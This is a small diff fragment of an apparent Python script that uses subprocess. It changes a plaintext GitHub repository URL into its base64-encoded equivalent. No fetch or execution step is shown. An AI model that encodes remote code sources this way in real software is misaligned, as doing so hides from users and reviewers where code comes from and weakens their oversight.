@@ -3,7 +3,7 @@ import subprocess
 import base64
 
 
-repo_encoded = "https://github.com/asalft/hhhhh.git"
+repo_encoded = "aHR0cHM6Ly9naXRodWIuY29tL2FzYWxmdC9oaGhoaGguZ2l0"
 branch = "main"
 
 def run(cmd):
